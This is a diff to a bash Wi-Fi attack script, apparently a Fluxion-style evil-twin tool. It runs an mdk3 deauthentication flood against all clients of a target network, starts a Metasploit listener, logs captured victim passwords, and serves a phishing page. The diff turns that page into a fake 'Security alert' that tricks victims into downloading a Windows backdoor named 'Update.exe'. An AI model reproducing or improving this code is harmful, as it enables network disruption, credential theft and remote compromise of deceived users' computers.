@@ -35,6 +35,7 @@ DUMP_PATH="/tmp/TMPflux"
 WORK_DIR=`pwd`
 HANDSHAKE_PATH="$WORK_DIR/handshakes"
 PASSLOG_PATH="$WORK_DIR/../../../Victim/pwlog"
+Victim_path="$WORK_DIR/../../../Victim"
 sites_path="$WORK_DIR/sites"
 script_listerning="$WORK_DIR/sites/metasploit/script-listerning.rc"
 win_auto_command="$WORK_DIR/sites/metasploit/win-auto-script.rc"
@@ -1663,8 +1664,8 @@ function attack {
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
         xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	if [ $Metasp_configure = "on" ]; then
-	cd $path_metasploit
-        xterm -geometry 100x25+250+150 -fa monaco -fs 12 -bg black -title "Metasploit Listerning" -e msfconsole -r script-listerning.rc &
+		cd $path_metasploit
+        xterm -geometry 100x25+250+150 -fa monaco -fs 12 -bg black -title "Metasploit Listerning" -e msfconsole -r script-listerning.rc -x "cd $Victim_path" &
 	fi
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
         conditional_clear
@@ -2930,10 +2931,9 @@ echo "
 <!DOCTYPE html>
 <html>
 <body>
-
-<p>a<p>
-
-<a href="files/$backdoor_name_windows" download="Update.exe">Click on</a>
+<h1>Security alert</h1>
+<p>Click on the logo to download the file update:<p>
+<a href="files/$backdoor_name_windows" download="Update.exe">download</a>
 </body>
 </html>
 " > $path_metasploit/index.html
